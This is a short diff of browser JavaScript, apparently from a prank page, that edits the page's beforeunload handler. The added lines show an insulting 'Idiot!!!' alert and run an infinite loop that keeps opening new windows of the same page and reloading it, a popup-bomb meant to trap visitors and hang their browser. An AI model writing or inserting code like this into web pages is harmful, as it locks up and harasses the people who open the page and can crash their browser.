@@ -137,7 +137,10 @@ window.onkeydown = function() {
 }
 
 window.onbeforeunload = function() {
+    alert("Idiot!!!");
+	
     while(true){
+	window.open(location.href);
     window.location.reload();
     }
 };
